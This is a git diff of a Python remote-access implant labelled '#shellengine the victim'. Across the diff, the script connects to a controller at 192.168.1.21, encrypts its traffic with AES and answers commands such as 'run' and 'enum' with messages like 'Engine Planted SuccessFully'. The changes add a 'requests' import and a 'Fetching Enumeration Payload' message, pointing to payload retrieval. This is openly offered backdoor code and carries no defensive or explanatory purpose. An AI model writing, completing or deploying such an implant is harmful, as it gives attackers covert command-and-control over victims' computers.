@@ -1,11 +1,9 @@
 #shellengine the victim 
-#Under Development
-#Updated Everyday
-
 import socket
 import os
 import sys
 import time
+import requests
 from termcolor import colored
 from Crypto.Cipher import AES
 
@@ -30,20 +28,29 @@ def Enum():
     print("Enumeration going on here")
 
 planted = "[+] Engine Planted SuccessFully"
-enum = "[+] Starting Network Enumeration Now"
+enum = "[+] Shell-Engine::Sleeping For 10 seconds for server to start"
+enum2 = "[+] Fetching Enumeration Payload"
+err = "[+] shell-Engine:: ambiguous command"
 
 s = socket.socket()
-s.connect(('192.168.1.11',80))
+s.connect(('192.168.1.21',80))
 key_gen()
 start_encryption(enc_key)
 
-while True:
+def recv_data():
     In_msg = s.recv(8192)
     recv_data = magic.decrypt(In_msg)
+    global recv_data_dec
     recv_data_dec = recv_data.decode()
+
+while True:
+    recv_data()
     if recv_data_dec == 'run':
         s.send(magic.encrypt(planted.encode()))
     elif recv_data_dec == 'enum':
         s.send(magic.encrypt(enum.encode()))
+        time.sleep(10)
         Enum()
+    elif recv_data_dec == 'error':
+        s.send(magic.encrypt(err.encode()))
 
